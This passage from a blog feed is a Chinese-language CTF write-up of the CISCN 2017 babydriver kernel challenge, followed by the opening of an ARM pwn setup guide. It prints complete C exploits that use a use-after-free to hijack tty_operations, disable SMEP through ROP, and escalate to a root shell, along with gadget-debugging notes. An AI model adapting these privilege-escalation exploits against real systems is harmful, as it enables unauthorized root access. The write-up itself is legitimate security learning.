class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">int</span> (*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %cs, tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq; popq tf+16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %rsp, tf+24;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %ss, tf+32;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Status saved!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_root</span><span class="params">()</span>        <span class="comment">// 如果不加返回值，这个函数会被编译成不返回</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> fake_tty_operations[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> fake_tty[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint64_t</span> rop[<span class="number">30</span>] = &#123;</span><br><span class="line">        <span class="number">0xffffffff810d238d</span>,         <span class="comment">// pop rdi ; ret 关闭SMEP</span></span><br><span class="line">        <span class="number">0x6f0</span>,</span><br><span class="line">        <span class="number">0xffffffff81004d80</span>,         <span class="comment">// mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        get_root,</span><br><span class="line">        <span class="number">0xffffffff81063694</span>,         <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xffffffff814ee0a4</span>,         <span class="comment">// opcode: 48 cf iretq</span></span><br><span class="line">    &#125;;</span><br><span class="line">    tf.rip = get_shell;</span><br><span class="line">    *(struct trap_frame*)(&amp;rop[<span class="number">8</span>]) = tf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">        fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>;            </span><br><span class="line">        <span class="comment">// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e </span></span><br><span class="line">        <span class="comment">// 0xffffffff8181bf7e: ret</span></span><br><span class="line">        <span class="comment">// 这个gadget，ROPgadget搜索结果错误，详见ERROR节</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;                <span class="comment">// pop rax; ret</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = rop;</span><br><span class="line">    fake_tty_operations[<span class="number">2</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;                </span><br><span class="line">    <span class="comment">// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e </span></span><br><span class="line">    <span class="comment">// 0xffffffff8181bf7e: ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_tty_operations;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="exploit3"><a href="#exploit3" class="headerlink" title="exploit3"></a>exploit3</h4><p>exp3和exp2很像，差别在于使用了ioctl触发的<code>tty_operations</code>。与write不同，调用ioctl是用的<code>call rax</code>，所以rax中所存储的就是ioctl函数的地址。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp3.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflag;</span><br><span class="line">    <span class="keyword">uint64_t</span> rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>) (<span class="title">struct</span> <span class="title">tty_driver</span> * <span class="title">driver</span>,</span></span><br><span class="line"><span class="class">  <span class="title">struct</span> <span class="title">file</span> * <span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver * driver, struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver * driver, struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct * tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct * tty,</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct * tty,</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct * tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct * tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct * tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct * tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct * tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct * tty, struct winsize * ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct * tty, struct termiox * tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct * tty,</span><br><span class="line">      struct serial_icounter_struct * icount);</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">int</span> (*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> xchgeaxesp = <span class="number">0xffffffff810e81e8</span>;         <span class="comment">// 0xffffffff810e81e8 : xchg eax, esp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %cs, tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq; popq tf+16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %rsp, tf+24;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %ss, tf+32;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// puts(&quot;status saved!&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> rop[<span class="number">30</span>] = &#123;</span><br><span class="line">        <span class="number">0xffffffff810d238d</span>,         <span class="comment">// pop rdi ; ret</span></span><br><span class="line">        <span class="number">0x6f0</span>,</span><br><span class="line">        <span class="number">0xffffffff81004d80</span>,         <span class="comment">// mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        get_root,</span><br><span class="line">        <span class="number">0xffffffff81063694</span>,         <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xffffffff814ee0a4</span>,         <span class="comment">// opcode: 48 cf iretq</span></span><br><span class="line">    &#125;;</span><br><span class="line">    tf.rip = get_shell;</span><br><span class="line">    *(struct trap_frame*)(&amp;rop[<span class="number">8</span>]) = tf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> base  = xchgeaxesp &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">    mmap(base, <span class="number">0x3000</span>, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(xchgeaxesp&amp;<span class="number">0xffffffff</span>, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">tty_ops</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    tty_ops.ioctl = xchgeaxesp;</span><br><span class="line">    <span class="keyword">uint64_t</span> fake_tty[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line">    fake_tty[<span class="number">3</span>] = &amp;tty_ops;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd_tty, <span class="number">0</span>, <span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><ul><li>musl-gcc 编译 32bit出错</li><li>ROPgadget 计算jmp relative地址错误</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4i 0xffffffff8181bfc5</span></span><br><span class="line">   0xffffffff8181bfc5:mov    rsp,rax</span><br><span class="line">   0xffffffff8181bfc8:dec    ebx</span><br><span class="line">   0xffffffff8181bfca:jmp    0xffffffff8181bf7e</span><br><span class="line">   0xffffffff8181bfcc:nop    DWORD PTR [rax+0x0]</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/hx 0xffffffff8181bfca</span></span><br><span class="line">0xffffffff8181bfca:0xb2eb</span><br></pre></td></tr></table></figure><p>ROPgadget所显示的gadget为<code>0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf83</code>。</p><p>从pwndbg得到opcode<code>ebb2</code>，是<code>jmp rel8</code>类型<a href="http://ref.x86asm.net/coder64.html#xEB">ref</a>，八位相对地址跳转<code>b2</code>最高位为1，是负数-0x4e，也就是向低地址跳转，<code>0xffffffff8181bfcc-0x4e = 0xffffffff8181bf7e</code>。</p><h2 id="to-do-list"><a href="#to-do-list" class="headerlink" title="to do list"></a>to do list</h2><ol><li>如何定位call rax/call [rax+0x38]（tty_operation)</li><li>struct size 计算。编译简单module <a href="http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">ref1</a> <a href="https://www.anquanke.com/post/id/203399#h2-10">ref2</a></li></ol><p><strong>to be continued…</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html">How to compile and install linux kernel 5.6.9 from souce code?</a></li><li><a href="http://mgalgs.github.io/2012/03/23/how-to-build-a-custom-linux-kernel-for-qemu.html">How to Build A Custom Linux Kernel For Qemu?</a></li><li><a href="https://m4x.fun/post/linux-kernel-pwn-abc-1">Linux Kernel Pwn ABC(Ⅰ)</a></li><li><a href="https://m4x.fun/post/linux-kernel-pwn-abc-2/">Linux Kernel Pwn ABC(II)</a></li><li><a href="https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/">Kernel调试文件总结</a></li><li><a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">What is the difference between the following kernel Makefile terms: vmLinux, vmlinuz, vmlinux.bin, zimage &amp; bzimage?</a></li><li><a href="https://www.anquanke.com/post/id/201043">Kernel Pwn 学习之路(一)</a></li><li><a href="https://stackoverflow.com/questions/11756153/whats-the-difference-between-iret-and-iretd-iretq">what’s the difference between iret and iretd,iretq?</a></li><li><a href="http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html">How to share files instantly between virtual machines and host</a></li><li><a href="https://xz.aliyun.com/t/4529">Linux Pwn技巧总结_1 – V1NKe</a></li><li><a href="https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">NCSTISC Linux Kernel PWN450 Writeup</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;内核文件区别&quot;&gt;&lt;a href=&quot;#内核文件区别&quot; class=&quot;headerlink&quot; title=&quot;内核文件区别&quot;&gt;&lt;/a&gt;内核文件区别&lt;/h3&gt;&lt;p&gt;&lt;code&gt;vmlinux&lt;/code&gt; 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vmlinuz&lt;/code&gt; 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Decompressing Linux... done&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Booting the kernel.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;zImage&lt;/code&gt; 是经过压缩的小内核（小于512KB）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bzImage&lt;/code&gt; 是经过压缩的大内核（大于512KB）。&lt;/p&gt;
&lt;h3 id=&quot;Initial-Ramdisk&quot;&gt;&lt;a href=&quot;#Initial-Ramdisk&quot; class=&quot;headerlink&quot; title=&quot;Initial Ramdisk&quot;&gt;&lt;/a&gt;Initial Ramdisk&lt;/h3&gt;&lt;p&gt;名字类似&lt;code&gt;initramfs.cpio&lt;/code&gt; 文件，一般可以使用cpio读取其中的文件。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; find . | cpio -o --format=newc &amp;gt; initramfs.cpio &lt;span class=&quot;comment&quot;&gt;# compress&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo cpio -idmv &amp;lt; initramfs.cpio &lt;span class=&quot;comment&quot;&gt;# depress&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;有时也经过了gzip的压缩。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; mv initramfs.cpio initramfs.cpio.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; gunzip initramfs.cpio.gz	&lt;span class=&quot;comment&quot;&gt;# 解压得到initramfs.cpio&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; cpio -idmv &amp;lt; initramfs.cpio&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;更改为正确的后缀之后，图形界面“归档管理器”也可以打开。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="Kernel Pwn" scheme="http://hhdx.xyz/tags/Kernel-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Arm pwn</title>
    <link href="http://hhdx.xyz/2020/10/17/Arm-pwn/"/>
    <id>http://hhdx.xyz/2020/10/17/Arm-pwn/</id>
    <published>2020-10-17T09:35:26.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install qemu-user gdb-multiarch</span></span><br></pre></td></tr></table></figure><p>安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。</p><h3 id="动态链接程序"><a href="#动态链接程序" class="headerlink" title="动态链接程序"></a>动态链接程序</h3><p>对于动态链接的程序，还需要安装跨平台的lib。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-cache search <span class="string">&quot;libc&quot;</span> | grep arm</span></span><br></pre></td></tr></table></figure><p>安装类似libc6-ARCH-cross。</p><p>动态链接库被安装在类似<code>/usr/arm-linux-gnueabihf/</code>的路径。qemu不知道动态链接的位置，它预期在类似<code>/etc/qemu-binfmt/arm</code>的路径，所以可以设置软链接来避免用<code>-L</code>来指定链接库位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 <span class="comment"># 对于aarch64</span></span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="运行"><a href="#运行" class="headerlink" 